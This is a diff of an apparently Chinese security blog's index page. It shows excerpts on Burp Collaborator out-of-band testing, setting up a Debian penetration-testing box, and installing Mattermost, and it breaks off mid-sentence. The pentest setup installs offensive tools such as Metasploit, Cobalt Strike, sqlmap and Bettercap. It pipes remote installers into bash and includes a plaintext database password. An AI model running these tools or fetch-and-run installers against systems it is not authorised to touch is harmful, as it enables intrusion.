@@ -1,674 +1,297 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-  <meta charset="utf-8">
-  
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
   <title>Blog of Secer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog of Secer">
-<meta property="og:url" content="http://id.cker.in/index.html">
-<meta property="og:site_name" content="Blog of Secer">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Blog of Secer">
-  
-    <link rel="alternate" href="/atom.xml" title="Blog of Secer" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
   
   
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
   
 
+  
 </head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Blog of Secer</a>
-      </h1>
-      
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://id.cker.in"></form>
-      </div>
-    </div>
-  </div>
 </header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-1145" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1145.seo/" class="article-date">
-  <time datetime="2016-07-30T01:42:15.000Z" itemprop="datePublished">2016-07-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+      
+<main class="content" role="main">
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/1145.seo/">Burpsuite之Burp Collaborator模块介绍</a>
-    </h1>
-  
-
-      </header>
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2016-07-30T01:42:15.000Z" itemprop="datePublished">
+          2016-07-30
+      </time>
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    | 
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/burpsuite/'>burpsuite</a>,
+    
+    <a href='/tag/SSRF/'>SSRF</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1145.seo/">Burpsuite之Burp Collaborator模块介绍</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
         <p><b>Burp Collaborator.</b><b>是从</b><b>Burp suite v1.6.15</b><b>版本添加的新功能，它几乎是一种全新的渗透测试方法。</b><b><a href="http://ha.cker.in/tag/BurpSuite" target="_blank">Burp</a> Collaborator.</b><b>会渐渐支持</b><b>blind <a href="http://ha.cker.in/tag/xss" target="_blank">XSS</a></b><b>，</b><b>SSRF</b><b>，</b><b> asynchronous code injection</b><b>等其他还未分类的漏洞类型。</b><b></b></p>  <p>本文主要介绍使用Burp Collaborator.对这几种类型漏洞进行探测。</p>  <p><b>概念：</b><b>In-band attack</b><b>与</b><b> out-band attack</b><b>（带内与带外攻击）</b><b></b></p>  <p>首先介绍两个概念，带内与带外的区别核心在于是否使用不同的通信通道。</p>  <p>在一次攻击当中,只有一条通道，属于in-band（带内）攻击：</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/31.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image001.png" width="657" height="133" /></a></p>  <p>现在同一次攻击下，不止一条信道，则属于out-band（带外）攻击：</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/222.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image002.png" width="656" height="391" /></a></p>  <p><b>常规</b><b>web</b><b>测试模型</b><b></b></p>  <p>简单的讲，常规的web测试模型就是我们向目标发送payloads，然后分析目标返回的数据。</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/33.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image003.png" width="554" height="115" /></a></p>  <p>这个模型很容易建立并且容易理解，但是这个简单的模型漏掉很多bugs，比如：</p>  <p>§ “super-blind” injection。”blind SQL injection”表示当一个payload破坏了正常的sql查询然而应用程序返回的内容没有任何有帮助的错误信息。但是在有些情况下，一个成功的注入在目标应用的返回里面是完全看不到区别的，意思就是，不论返回的内容还是返回的时间，都没有任何区别。举个例子，注入asynchronous logging function就是一个典型的情况</p>  <p>§ 需要存储数据的情况。比如存储型xss理论上通过先提交payloads然后观察返回值是可以发现的。但是其他的存储型bugs很难发现，比如，stored (or second-order) SQL injection,数据先是以安全的方式存储在数据库中，然后再从数据库取出再拼接sql语句。要使用常规渗透模型发现这种漏洞，我们需要爆破每一种请求的组合，要先发送第一个request请求，然后在发送第二个request请求，然后观察返回值。</p>  <p>§ 我们还会漏掉一种漏洞，一次成功的攻击只发生在应用内部，对攻击者是不可见的。比如，存储型xss攻击成功要求管理员访问管理地址。</p>  <p>§ 还有很多涉及到内部系统与外部资源交互的情况，比如SSRF和RFI等漏洞。</p>  <p><b>加入</b><b>Burp Collaborator</b><b>后的</b><b>web</b><b>测试模型</b><b></b></p>  <p>Burp Collaborator 给传统web测试模型添加了一个新的部分，Burp Collaborator的功能有：</p>  <p>§ 捕捉由Burp发出的payloads触发的目标与外部系统发生数据交互行为</p>  <p>§ 把Burp Collaborator与目标数据交互行为产生的返回数据传回攻击者</p>  <p>§ 对很多新型漏洞进行可靠的探测。 <a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/341.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image004.png" width="554" height="295" /></a></p>  <p>Burp Collaborator模块包含如下特征：</p>  <p>§ Burp Collaborator 服务器通常运行在公网上。</p>  <p>§ 它使用自己的专用域名，并且这个服务器已注册为该域名的权威DNS服务器。</p>  <p>§ 它提供一个DNS服务，可以响应任何对他的dns请求</p>  <p>§ 它提供HTTP/HTTPS 服务，使用一个有效的SSL证书</p>  <p>§ 将来可以添加其他的服务，比如smtp和ftp。</p>  <p><b>探测</b><b>external service interaction</b><b>（外部服务交互攻击）</b><b></b></p>  <p>与外部服务交互行为发生在一个payload提交到目标应用上，导致目标通过某个网络协议和一个外部的域名进行信息交互。</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/35.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image005.png" width="554" height="373" /></a></p>  <p>这种行为有时候被称为<a href="http://ha.cker.in/tag/SSRF" target="_blank">SSRF</a>，我们更偏向于称之为外部服务交互（”external service interaction”）攻击，因为这种情况里面，很多行为不仅仅通过HTTP协议触发，还有SMB或者FTP等。</p>  <p>外部服务交互可以代表一个严重的漏洞，因为他可以允许应用服务器作为一个代理来攻击其他的服务器。这包裹公网上面的第三方系统，同一个组织下的内部系统或者监听在本地的服务。根据网络结构，这可以将内部容易被攻击的系统暴露给外部的攻击者。</p><br>
-        
-          <p class="article-more-link">
-            <a href="/1145.seo/#more">Read More</a>
-          </p>
-        
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1145.seo/" data-id="cirz4nzu200dsoz76or4grokl" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1145.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/SSRF/">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/burpsuite/">burpsuite</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/xss/">xss</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1144" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1144.seo/" class="article-date">
-  <time datetime="2016-07-20T10:05:37.000Z" itemprop="datePublished">2016-07-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/linux笔记/">linux笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2016-07-20T10:05:37.000Z" itemprop="datePublished">
+          2016-07-20
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1144.seo/">Debian 8.3 Mate搭建渗透测试环境</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/SQLmap/'>SQLmap</a>,
     
-    <div class="article-entry" itemprop="articleBody">
+    <a href='/tag/cobaltstrike/'>cobaltstrike</a>,
+    
+    <a href='/tag/Metasploit/'>Metasploit</a>,
+    
+    <a href='/tag/Armitage/'>Armitage</a>,
+    
+    <a href='/tag/wpscan/'>wpscan</a>,
+    
+    <a href='/tag/msf/'>msf</a>,
+    
+    <a href='/tag/Debian/'>Debian</a>,
+    
+    <a href='/tag/Bettercap/'>Bettercap</a>,
+    
+    <a href='/tag/fierce/'>fierce</a>,
+    
+    <a href='/tag/Docker/'>Docker</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1144.seo/">Debian 8.3 Mate搭建渗透测试环境</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p><a href="http://ha.cker.in/tag/Debian" target="_blank">Debian</a> 8.3 Mate 下载地址    <br><a href="http://cdimage.debian.org/debian-cd/current-live/amd64/iso-hybrid/" target="_blank" rel="external">http://cdimage.debian.org/debian-cd/current-live/amd64/iso-hybrid/</a>    <br><a href="http://cdimage.debian.org/debian-cd/8.3.0-live/amd64/iso-hybrid/debian-live-8.3.0-amd64-mate-desktop.iso" target="_blank" rel="external">http://cdimage.debian.org/debian-cd/8.3.0-live/amd64/iso-hybrid/debian-live-8.3.0-amd64-mate-desktop.iso</a>    <br><a href="http://cdimage.debian.org/debian-cd/current-live/amd64/iso-hybrid/debian-live-8.3.0-amd64-mate-desktop.iso" target="_blank" rel="external">http://cdimage.debian.org/debian-cd/current-live/amd64/iso-hybrid/debian-live-8.3.0-amd64-mate-desktop.iso</a>    <br>#Ubuntu Mate ISO <a href="http://cdimage.ubuntu.com/ubuntu-mate/releases/15.04/release/ubuntu-mate-15.04-desktop-amd64.iso" target="_blank" rel="external">http://cdimage.ubuntu.com/ubuntu-mate/releases/15.04/release/ubuntu-mate-15.04-desktop-amd64.iso</a></p>  <p>&#160;</p>  <p>Debian 安装msf # ruby2.3.1</p>  <blockquote>   <p>apt-get install pptp-linux network-manager-pptp build-essential zlib1g zlib1g-dev libxml2 libxml2-dev libxslt-dev locate libreadline6-dev libcurl4-openssl-dev git-core libssl-dev libyaml-dev openssl autoconf libtool ncurses-dev bison curl wget postgresql postgresql-contrib libpq-dev libapr1 libaprutil1 libsvn1 libpcap-dev git-core postgresql curl nmap libsqlite3-dev default-jdk screen subversion –y&#160;&#160; #必要组件</p> </blockquote>  <p>ruby用rvm装吧</p>  <blockquote>   <p>$ curl -sSL <a href="https://rvm.io/mpapis.asc" target="_blank" rel="external">https://rvm.io/mpapis.asc</a> | gpg –import -     <br>$ \curl -sSL <a href="https://get.rvm.io" target="_blank" rel="external">https://get.rvm.io</a> | bash -s stable      <br># 如果上面的连接失败，可以尝试:       <br>$ curl -L <a href="https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer" target="_blank" rel="external">https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer</a> | bash -s stable      <br>$ source /etc/profile.d/rvm.sh      <br>rvm install ruby-2.3.1      <br>#rvm install ruby-2.1.8      <br>rvm use 2.3.1 –default      <br>gem install bundler</p> </blockquote>  <p>&#160;</p>  <p>apt-get install rubygems-integration rubygems   <br>gem install wirble sqlite3 <strong>bundler</strong>    <br>###下面各种报错都是国内网络不稳定造成，直接上vpn解决##    <br>#报错<strong>Unable to download data from <a href="https://rubygems.org/" target="_blank" rel="external">https://rubygems.org/</a> - Errno::ECONNRESET: Connection reset by peer - SSL_connect</strong>，解决如下</p>  <blockquote>   <p>wget <a href="https://raw.githubusercontent.com/rubygems/rubygems/master/lib/rubygems/ssl_certs/AddTrustExternalCARoot-2048.pem" target="_blank" rel="external">https://raw.githubusercontent.com/rubygems/rubygems/master/lib/rubygems/ssl_certs/AddTrustExternalCARoot-2048.pem</a>      <br>gem which rubygems      <br>/usr/lib/ruby/2.1.0/rubygems.rb      <br>cp ~/Downloads/AddTrustExternalCARoot-2048.pem /usr/lib/ruby/2.1.0/rubygems/ssl_certs/      <br>gem install wirble sqlite3 bundler</p> </blockquote>  <p>排错：</p>  <blockquote>   <p>#when download from https, may has SSL error, then: <strong>gem sources –remove </strong><a href="https://rubygems.org" target="_blank" rel="external">https://rubygems.org</a><strong> ; gem sources –add </strong><a href="http://rubygems.org" target="_blank" rel="external">http://rubygems.org</a> or bundle config mirror.<a href="https://rubygems.org" target="_blank" rel="external">https://rubygems.org</a> <a href="https://ruby.taobao.org" target="_blank" rel="external">https://ruby.taobao.org</a>      <br>head -1 /path/to/metasploit-framework/Gemfile      <br>source ‘<a href="http://rubygems.org'" target="_blank" rel="external">http://rubygems.org’</a></p> </blockquote>  <p>&#160;</p>  <p>设置Postgresql数据库及用户</p>  <blockquote>   <p>sudo -s     <br>su postgres      <br>createuser msf -P -S -R -D      <br>Enter password for new role: <strong><em>      <br>Enter it again: </em></strong>      <br>createdb -O msf msf      <br>exit</p> </blockquote>  <p>cd /opt/; git clone <a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework.git</a>    <br>cd <a href="http://ha.cker.in/tag/metasploit" target="_blank">metasploit</a>-framework/    <br><strong>bundle install</strong>    <br>bash -c ‘for MSF in $(ls msf<em>); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done’    <br>nano /opt/metasploit-framework/config/database.yml    <br></em></p>  <blockquote>   <p>production:     <br>adapter: postgresql      <br>database: msf      <br>username: msf      <br>password: msf      <br>host: 127.0.0.1      <br>port: 5432      <br>pool: 75      <br>timeout: 5</p> </blockquote>  <p>   <br>sh -c &quot;echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml &gt;&gt; /etc/profile&quot;    <br>### sh -c &quot;echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml &gt;&gt; ～/.bashrc&quot;    <br><strong>source /etc/profile</strong>    <br>安装中文输入法    <br>apt-get install ibus ibus-googlepinyin ibus-sunpinyin</p>  <p>&#160;</p>  <p>安装<a href="http://ha.cker.in/tag/Armitage" target="_blank">Armitage</a></p>  <blockquote>   <p>curl -# -o /tmp/armitage.tgz <a href="http://www.fastandeasyhacking.com/download/armitage-latest.tgz" target="_blank" rel="external">http://www.fastandeasyhacking.com/download/armitage-latest.tgz</a>      <br>tar -xvzf /tmp/armitage.tgz -C /opt      <br>ln -s /opt/armitage/armitage /usr/local/bin/armitage      <br>ln -s /opt/armitage/teamserver /usr/local/bin/armitage_teamserver      <br>sh -c &quot;echo java -jar /opt/armitage/armitage.jar \$\ &gt; /opt/armitage/armitage&quot;      <br>perl -pi -e ‘s/armitage.jar/\/opt\/armitage\/armitage.jar/g’ /opt/armitage/teamserver</p> </blockquote>  <p>安装<a href="http://ha.cker.in/tag/cobaltstrike" target="_blank">CobaltStrike</a>    <br>US代理，获取cobaltstrike</p>  <blockquote>   <p>firefox <a href="https://www.cobaltstrike.com/download" target="_blank" rel="external">https://www.cobaltstrike.com/download</a>      <br>tar -xvzf /tmp/cobaltstrike.tgz -C /opt      <br>ln -s /opt/cobaltstrike/cobaltstrike /usr/local/bin/cobaltstrike      <br>ln -s /opt/cobaltstrike/teamserver /usr/local/bin/cobaltstrike_teamserver      <br>sh -c &quot;echo java -jar /opt/cobaltstrike/cobaltstrike.jar \$* &gt; /opt/cobaltstrike/cobaltstrike&quot;      <br>#perl -pi -e ‘s/cobaltstrike.jar/\/opt\/cobaltstrike\/cobaltstrike.jar/g’ /opt/cobaltstrike/teamserver</p> </blockquote>  <p>安装<a href="http://ha.cker.in/tag/sqlmap" target="_blank">SQLMap</a></p>  <blockquote>   <p>cd /usr/share/; git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="external">https://github.com/sqlmapproject/sqlmap.git</a>      <br>ln -s /usr/share/sqlmap/sqlmap.py /usr/bin/sqlmap</p> </blockquote>  <p>安装<a href="http://ha.cker.in/tag/Bettercap" target="_blank">Bettercap</a></p>  <blockquote>   <p>apt-get install build-essential ruby-dev libpcap-dev     <br>gem install bettercap      <br>gem update bettercap</p> </blockquote>  <p>安装 DNSEnum</p>  <blockquote>   <p>DNSenum <a href="http://dnsenum.googlecode.com/files/dnsenum1.2.tar.gz" target="_blank" rel="external">http://dnsenum.googlecode.com/files/dnsenum1.2.tar.gz</a>      <br>git clone <a href="https://github.com/fwaeytens/dnsenum.git" target="_blank" rel="external">https://github.com/fwaeytens/dnsenum.git</a>      <br>cd dnsenum/      <br>安装缺失的模块：cpan XXX::xxx</p> </blockquote>  <p>安装 <a href="http://ha.cker.in/tag/fierce" target="_blank">fierce</a></p>  <blockquote>   <p>$ cd /usr/share     <br>$ svn co <a href="https://svn.assembla.com/svn/fierce/fierce2/trunk/" target="_blank" rel="external">https://svn.assembla.com/svn/fierce/fierce2/trunk/</a> fierce2/      <br>$ cd fierce2/      <br>$ perl Makefile.PL      <br>$ make      <br>$ make test      <br>$ make install      <br>$ ln -s /usr/local/bin/fierce /usr/share/fierce2/fierce      <br>$ mkdir -p /pentest/enumeration/fierce/      <br>$ ln -s /usr/local/bin/fierce /pentest/enumeration/fierce/fierce</p>    <p>cpan Net::DNS #安装缺失的库     <br>cpan Net::DNS::Resolver #貌似可以解决报错 improperly terminated AXFR at D:\tools\fierce-0.9.9\fierce.pl line 228.</p> </blockquote>  <p>安装<a href="http://ha.cker.in/tag/wpscan" target="_blank">WPScan</a></p>  <blockquote>   <p>Installing on Debian:     <br>sudo apt-get install git ruby ruby-dev libcurl4-openssl-dev make zlib1g-dev      <br>cd /usr/share/; git clone <a href="https://github.com/wpscanteam/wpscan.git" target="_blank" rel="external">https://github.com/wpscanteam/wpscan.git</a>      <br>cd <a href="http://ha.cker.in/tag/wpscan" target="_blank">wpscan</a></p>    <p>gem install bundler &amp;&amp; bundle install –without test –path vendor/bundle     <br>alias wpscan=’ruby /usr/share/wpscan/wpscan.rb –enumerate u –enumerate p –enumerate t –url ‘      <br></p> </blockquote>  <p>或者安装<a href="http://ha.cker.in/tag/Docker" target="_blank">Docker</a>后安装Docker的wpscan</p>  <blockquote>   <p>docker pull wpscanteam/wpscan     <br>docker run –rm wpscanteam/wpscan -u <a href="http://yourblog.com" target="_blank" rel="external">http://yourblog.com</a> [options]</p> </blockquote>  <p>&#160;</p>  <p>安装PPTP <a href="http://ha.cker.in/tag/VPN" target="_blank">VPN</a>支持</p>  <blockquote>   <p>apt-get install network-manager-openvpn network-manager-pptp network-manager-pptp-gnome network-manager-vpnc     <br>service network-manager restart</p> </blockquote>  <p>&#160;</p>  <p>&#160;</p>  <p>安装GuardScan</p>  <blockquote>   <p>wget <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="external">https://bootstrap.pypa.io/get-pip.py</a>      <br>python get-pip.py      <br>pip install tornado      <br>#安装个lnmp      <br>apt-get install screen      <br>screen -S lnmp      <br>wget -c <a href="http://soft.vpser.net/lnmp/lnmp1.2-full.tar.gz" target="_blank" rel="external">http://soft.vpser.net/lnmp/lnmp1.2-full.tar.gz</a> &amp;&amp; tar zxf lnmp1.2-full.tar.gz &amp;&amp; cd lnmp1.2-full &amp;&amp; ./install.sh lnmp      <br>#wget -c <a href="http://soft.vpser.net/lnmp/lnmp1.3beta-full.tar.gz" target="_blank" rel="external">http://soft.vpser.net/lnmp/lnmp1.3beta-full.tar.gz</a> &amp;&amp; tar zxf lnmp1.3beta-full.tar.gz &amp;&amp; cd lnmp1.3beta-full &amp;&amp; ./install.sh lnmp</p> </blockquote>  <p>&#160;</p>  <p><a href="http://ha.cker.in/tag/MySQL" target="_blank">mysql</a></p>  <blockquote>   <p>create database pscan;      <br>use pscan;       <br>source pscan.sql      <br>CREATE USER ‘pscan’@’%’ IDENTIFIED BY ‘RFwPauXUhF4sWtSq’;GRANT USAGE ON <em>.</em> TO ‘pscan’@’%’ IDENTIFIED BY ‘<em>**’ REQUIRE NONE WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;GRANT ALL PRIVILEGES ON <code>pscan</code>.</em> TO <a href="mailto:'pscan'@'%'" target="_blank" rel="external">‘pscan’@’%’</a>;</p> </blockquote>  <p>修改conn.php中的数据库信息   <br>修改 ./proxy/isqlmap.py    <br>self.webserver=&quot;<a href="http://localhost:88/" target="_blank" rel="external">http://localhost:88/&quot;</a>    <br>改成你自己的主机地址和端口。     <br>修改./proxy/task.py    <br>def update():     <br>url=&quot;<a href="http://localhost:88/api.php?type=sqlmap_update" target="_blank" rel="external">http://localhost:88/api.php?type=sqlmap_update&quot;</a>    <br>urllib2.urlopen(url).read()     <br>def api_get():     <br>url=&quot;<a href="http://localhost:88/api.php?type=api_get" target="_blank" rel="external">http://localhost:88/api.php?type=api_get&quot;</a>    <br>data=urllib2.urlopen(url).read()    <br>改成你的host地址</p>  <p>   <br>配置     <br>打开 <a href="http://localhost:88/config.php" target="_blank" rel="external">http://localhost:88/config.php</a> 在list里面添加sqlmapapi节点     <br>格式为    <br><a href="http://127.0.0.1:8775" target="_blank" rel="external">http://127.0.0.1:8775</a> (不需要最后一个/)    <br>浏览器设置代理，并且添加一个<a href="http">http</a> header    <br>User-Hash: youhash</p>  <p>   <br>使用     <br>首先运行sqlmapapi，并且在config里面增加至少一个节点    <br>cd proxy/     <br>python proxy_io.py 8080&amp;     <br>python task.py&amp;    <br>然后将浏览器代理设置为    <br>http 127.0.0.1 8080    <br>然后一顿请求之后可以打开    <br><a href="http://localhost:88/config.php" target="_blank" rel="external">http://localhost:88/config.php</a></p>  <p>&#160;</p>  <p>仅作记录，呵呵 工具党。</p>
+        Debian 8.3 Mate 下载地址    http://cdimage.debian.org/debian-cd/current-live/amd64/iso-hybrid/    http://cdimage.debian.org/debian-cd/8.3.0-live/amd64/iso-hybrid/debian-live-8.3.0-amd64-mate-desktop.iso    http://cdimage.deb
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1144.seo/" data-id="cirz4nztn00czoz769xdu0hrr" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1144.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Armitage/">Armitage</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Bettercap/">Bettercap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Debian/">Debian</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Docker/">Docker</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Metasploit/">Metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/SQLmap/">SQLmap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/cobaltstrike/">cobaltstrike</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/fierce/">fierce</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/msf/">msf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/wpscan/">wpscan</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1143" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1143.seo/" class="article-date">
-  <time datetime="2016-07-20T09:51:05.000Z" itemprop="datePublished">2016-07-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/精品软件/">精品软件</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2016-07-20T09:51:05.000Z" itemprop="datePublished">
+          2016-07-20
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1143.seo/">Debian Jessie搭建Mattermost</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/Mattermost/'>Mattermost</a>
     
-    <div class="article-entry" itemprop="articleBody">
+    
+</span>
+      <h2 class="post-title"><a href="/1143.seo/">Debian Jessie搭建Mattermost</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p></p><h4>Websocket聊天,不支持xmpp</h4>  <p>&#160;</p>  <h4>Install Debian Jessie (x64)</h4>  <br>1. Set up 3 machines with Debian Jessie with 2GB of RAM or more. The servers will be used for the Load Balancer, Mattermost (this must be x64 to use pre-built binaries), and Database.  <br>2. This can also be set up all on a single server for small teams:• I have a Mattermost instance running on a single Debian Jessie server with 1GB of ram and 30 GB SSD  <br>• This has been working in production for ~20 users without issue.  <br>• The only difference in the below instructions for this method is to do everything on the same server  <br>• Make sure the system is up to date with the most recent security patches.• sudo apt-get update  <br>• sudo apt-get upgrade  <h4>Set up Database Server</h4>  <br>1. For the purposes of this guide we will assume this server has an IP address of 10.10.10.1  <br>2. Install PostgreSQL 9.3+ (or MySQL 5.6+)• sudo apt-get install postgresql postgresql-contrib  <br>• PostgreSQL created a user account called postgres. You will need to log into that account with:• sudo -i -u postgres  <br>• You can get a PostgreSQL prompt by typing:• psql  <br>• Create the Mattermost database by typing:• postgres=# CREATE DATABASE mattermost;  <br>• Create the Mattermost user by typing:• postgres=# CREATE USER mmuser WITH PASSWORD ‘mmuser_password’;  <br>• Grant the user access to the Mattermost database by typing:• postgres=# GRANT ALL PRIVILEGES ON DATABASE mattermost to mmuser;  <br>• You can exit out of PostgreSQL by typing:• postgre=# \q  <br>• You can exit the postgres account by typing:• exit  <br>• Allow Postgres to listen on all assigned IP Addresses• sudo vi /etc/postgresql/9.3/main/postgresql.conf  <br>• Uncomment ‘listen_addresses’ and change ‘localhost’ to ‘<em>’  <br>• Alter pg_hba.conf to allow the mattermost server to talk to the postgres database• sudo vi /etc/postgresql/9.3/main/pg_hba.conf  <br>• Add the following line to the ‘IPv4 local connections’  <br>• host all all 10.10.10.2/32 md5  <br>• Reload Postgres database• sudo /etc/init.d/postgresql reload  <br>• Attempt to connect with the new created user to verify everything looks good• psql –host=10.10.10.1 –dbname=mattermost –username=mmuser –password  <br>• mattermost=&gt; \q  <h4>Set up <a href="http://ha.cker.in/tag/Mattermost" target="_blank">Mattermost</a> Server</h4>  <p>   <br>1. For the purposes of this guide we will assume this server has an IP address of 10.10.10.1    <br>2. Download the latest Mattermost Server by typing:    <br>• wget <a href="https://github.com/mattermost/platform/releases/download/vX.X.X/mattermost.tar.gz" target="_blank" rel="external">https://github.com/mattermost/platform/releases/download/vX.X.X/mattermost.tar.gz</a>    <br>• Where vX.X.X is the latest Mattermost release version. For example, v2.0.0    <br>• Install Mattermost under /opt    <br>• Unzip the Mattermost Server by typing:    <br>• tar -xvzf mattermost.tar.gz    <br>• sudo mv mattermost /opt    <br>• Create the storage directory for files. We assume you will have attached a large drive for storage of images and files. For this setup we will assume the directory is located at /opt/mattermost/data.    <br>• Create the directory by typing:    <br>• sudo mkdir -p /opt/mattermost/data    <br>• Create a system user and group called 